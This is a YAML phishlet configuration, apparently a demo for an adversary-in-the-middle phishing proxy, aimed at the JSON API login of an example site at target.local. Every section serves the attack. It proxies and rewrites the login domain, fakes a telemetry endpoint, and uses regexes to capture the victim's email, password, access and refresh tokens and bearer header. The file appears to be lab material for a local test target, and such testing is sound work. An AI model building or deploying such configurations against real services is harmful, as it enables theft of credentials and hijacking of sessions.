name: api-login
author: demo
version: "1"

# Attacks the JSON API login of the target-site example (examples/target-site/).
# Demonstrates: auth_tokens type: body and type: header, credentials type: json,
# and intercept.

proxy_hosts:
  - phish_sub: login
    orig_sub:  login
    domain:    target.local
    is_landing: true
    upstream_scheme: https

sub_filters:
  - hostname:   login.target.local
    mime_types: [text/html, text/javascript, application/javascript]
    search:     'https://login\.target\.local'
    replace:    'https://{hostname}'
  - hostname:   login.target.local
    mime_types: [text/html, text/javascript, application/javascript]
    search:     target\.local
    replace:    '{domain}'

intercept:
  # Same telemetry swallowing as the form-login phishlet — the API login page
  # also sends browser telemetry on load.
  - path:         "^/api/telemetry$"
    status:       200
    content_type: application/json
    body:         '{"status":"ok"}'

auth_tokens:
  # The API login endpoint returns tokens in the JSON body and as a response
  # header. Session completes when access_token is captured from the body.
  - type:   body
    domain: login.target.local
    keys:
      - name:     access_token
        search:   '"access_token"\s*:\s*"([^"]+)"'
        required: true
      - name:     refresh_token
        search:   '"refresh_token"\s*:\s*"([^"]+)"'
        required: false

  - type:   header
    domain: login.target.local
    keys:
      - name:     "^X-Auth-Token$"
        search:   "Bearer (.+)"
        required: false

credentials:
  username:
    key:    "email"
    search: '"email"\s*:\s*"([^"]+)"'
    type:   json
  password:
    key:    "password"
    search: '"password"\s*:\s*"([^"]+)"'
    type:   json

login:
  domain: login.target.local
  path:   /api/login
